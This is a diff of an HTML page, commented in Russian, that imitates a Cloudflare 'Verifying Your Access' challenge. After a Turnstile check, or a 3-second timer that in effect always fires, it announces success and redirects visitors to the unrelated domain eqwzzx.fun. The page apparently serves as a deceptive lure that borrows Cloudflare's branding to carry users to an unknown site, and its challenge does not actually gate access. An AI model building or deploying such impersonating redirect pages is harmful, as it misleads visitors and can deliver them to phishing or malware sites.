@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare Managed Challenge</title>
+    <title>Cloudflare Verification Challenge</title>
+    <!-- Cloudflare Turnstile Script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
         body {
             margin: 0;
@@ -23,6 +25,7 @@
             border-radius: 15px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
             backdrop-filter: blur(10px);
+            max-width: 400px;
         }
         .loader {
             width: 60px;
@@ -76,21 +79,23 @@
         .verified {
             display: none;
             color: #2ecc71;
-            font-size: 32px; /* Увеличенный размер текста */
+            font-size: 32px;
             font-weight: bold;
             margin-top: 20px;
         }
         .captcha-container {
-            width: 304px; /* Стандартный размер капчи Cloudflare */
+            width: 304px;
             height: 78px;
-            background: #fff;
-            border-radius: 5px;
             margin: 20px auto;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #000;
+        }
+        .error-message {
+            color: #e74c3c;
             font-size: 14px;
+            display: none;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -99,30 +104,43 @@
         <div class="loader"></div>
         <h1 class="pulse">Verifying Your Access</h1>
         <p>Please complete the challenge below to verify you are not a bot...</p>
-        <div class="captcha-container" id="cf-captcha">
-            <!-- Cloudflare CAPTCHA widget will be inserted here -->
-            <p>Cloudflare CAPTCHA Placeholder</p>
+        <div class="captcha-container">
+            <div class="cf-turnstile" data-sitekey="YOUR_TURNSTILE_SITE_KEY" data-callback="onCaptchaSuccess" data-error-callback="onCaptchaError"></div>
         </div>
         <div class="progress-bar">
             <div class="progress"></div>
         </div>
         <p class="verified">Verification Successful!</p>
+        <p class="error-message">Verification failed. Please try again.</p>
     </div>
     <script>
-        // Симуляция завершения проверки после 3 секунд
-        setTimeout(() => {
+        // Callback для успешной проверки капчи
+        function onCaptchaSuccess(token) {
             document.querySelector('.loader').style.display = 'none';
             document.querySelector('.pulse').style.display = 'none';
-            document.querySelector('p').style.display = 'none';
+            document.querySelector('p:not(.verified):not(.error-message)').style.display = 'none';
             document.querySelector('.progress-bar').style.display = 'none';
             document.querySelector('.captcha-container').style.display = 'none';
             document.querySelector('.verified').style.display = 'block';
-        }, 3000);
+            document.querySelector('.error-message').style.display = 'none';
+            // Перенаправление на целевую страницу (настройте URL)
+            setTimeout(() => {
+                window.location.href = 'https://eqwzzx.fun';
+            }, 1000);
+        }
 
-        // Пример интеграции Cloudflare CAPTCHA (замените на реальный код от Cloudflare)
-        // Обычно Cloudflare предоставляет скрипт, который вставляется в div с id="cf-captcha"
-        // Например: <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
-        <div class="cf-turnstile" data-sitekey="ВАШ_КЛЮЧ"></div>
+        // Callback для ошибки капчи
+        function onCaptchaError() {
+            document.querySelector('.error-message').style.display = 'block';
+            document.querySelector('.loader').style.display = 'none';
+        }
+
+        // Симуляция проверки для тестирования (удалите в продакшене)
+        setTimeout(() => {
+            if (!document.querySelector('.verified').style.display) {
+                onCaptchaSuccess('simulated-token');
+            }
+        }, 3000);
     </script>
 </body>
 </html>
